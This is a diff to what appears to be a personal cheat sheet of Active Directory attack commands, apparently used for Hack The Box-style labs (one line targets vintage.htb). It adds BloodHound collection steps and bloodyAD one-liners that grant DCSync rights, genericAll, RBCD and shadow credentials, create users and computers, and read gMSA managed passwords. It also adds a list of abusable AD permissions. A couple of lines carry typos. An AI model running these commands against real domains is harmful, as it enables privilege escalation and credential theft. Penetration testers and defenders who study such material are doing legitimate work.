@@ -346,14 +346,65 @@ impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes :8846F7EAEE8FB117AD06BDD
 +---------- Visualise LDAP ----------+
 godap $TARGET -d $DOM -t ldap/$DC -k
 
-+---------- Write Permissions ----------+
++---------- Bloodhound Data ----------+
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
+
+bloodhound
+chromium http://127.0.0.1:8080
+MATCH (u:User) RETURN u
+
++---------- Get Write Permissions ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get writable --detail
 
-+---------- Get User Information ----------+
-for user in $(cat usernames); do bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object $user 2>/dev/null | grep -v 'nTSecurityDescriptor:'; done | tee out_user_info
-
-+---------- Add User to Group ----------+
++---------- Add Commands ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'GROUP' 'USER'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add user 'myuser' '123qweasdF!'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add computer 'mypc' '123qweasdF!'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add rbcd 'TARGET' 'SERVICE'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add genericAll 'TARGET' 'TRUSTEE'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add dcsync 'TRUSTEE'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add shadowCredentials 'TARGET'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add add uac 'TARGET'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add dnsRecord 'xxx.domain.example' '8.8.8.8'
+
++---------- LDAP Queries ----------+
+bloodyAD --dc-ip 10.10.11.45 --host dc01.vintage.htb -d vintage.htb -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306368)))" | grep -v 'nTSecurityDescriptor:' | tee out_computers-info)
+bloodyAD --dc-ip 10.10.11.45 --host dc01.vintage.htb -d vintage.htb -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306369)))" | grep -v 'nTSecurityDescriptor:' | tee out_users-info
+
++---------- Check for Permissions ----------+
+adminCount
+AllExtendedRights
+description
+displayName
+distinguishedName
+ForceChangePassword
+GenericAll
+GenericWrite
+homeDirectory
+logonHours
+logonWorkstation
+member
+memberOf
+msDS-AllowedToActOnBehalfOfOtherIdentity
+msDS-AllowedToDelegateTo
+msDS-GroupMSAMembership
+msDS-KeyCredentialLink
+msDS-ManagedPassword
+msDS-PrimaryComputer
+primaryGroupID
+profilePath
+ResetPassword
+sAMAccountName
+scriptPath
+Self
+servicePrincipalName
+tokenGroups
+unicodePwd
+UserAccountControl
+ValidatedMSDS-AllowedToActOnBehalfOfOtherIdentity
+ValidatedSPN
+WriteDacl
+WriteOwner
 
 +---------- Get msDS-ManagedPassword ----------+
 bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' get object MGTSVC$ --attr msDS-ManagedPassword
@@ -532,6 +583,13 @@ while read -r user; do finger "$user"@$TARGET; done < usernames
 [*] (88) Kerberos
 +---------- Domain Information ----------+
 nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET'
+
++---------- Bloodhound Data ----------+
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
+
+bloodhound
+chromium http://127.0.0.1:8080
+MATCH (u:User) RETURN u
 
 +---------- Create .ccache ----------+
 impacket-getTGT -dc-ip $TARGET $DOM/Guest -no-pass
